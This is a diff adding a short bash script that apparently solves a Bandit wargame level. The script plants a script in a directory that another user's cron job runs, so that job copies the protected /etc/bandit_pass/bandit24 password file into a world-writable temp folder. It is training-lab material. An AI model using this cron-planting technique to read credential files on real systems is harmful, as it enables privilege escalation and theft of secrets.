@@ -1,0 +1,32 @@
+
+#copy and paste this directly to the terminal
+
+# mk temp directory to use
+cd $(mktemp -d)
+temp=$(pwd) 
+
+# to view the original script
+# original="/usr/bin/cronjob_bandit24.sh"
+# cat $original
+
+# set destination
+house="/var/spool/bandit24/foo"
+
+# create files
+touch password getpass
+chmod 777 -R .  
+
+# setup script to be run by cronjob
+echo '#!/bin/bash' >> getpass   
+echo "cat /etc/bandit_pass/bandit24 > $temp/password" >> getpass
+cp getpass $house
+
+# variable management
+unset $temp
+unset $house
+
+# wait 1 minute and check password file for password
+# dont forget to wipe your temp directory with rm -r $(pwd)!
+
+#rm -r $(pwd) && cd
+
